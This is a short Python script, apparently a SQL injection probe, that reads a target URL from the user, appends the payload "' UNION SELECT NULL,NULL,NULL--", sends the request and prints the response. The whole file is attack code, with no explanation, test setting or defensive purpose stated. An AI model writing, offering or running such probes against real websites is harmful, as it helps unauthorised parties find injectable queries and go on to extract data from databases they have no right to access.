import requests

url = input("URL: ")
payload = "' UNION SELECT NULL,NULL,NULL--"

response = requests.get(url + payload)
print(response.text)
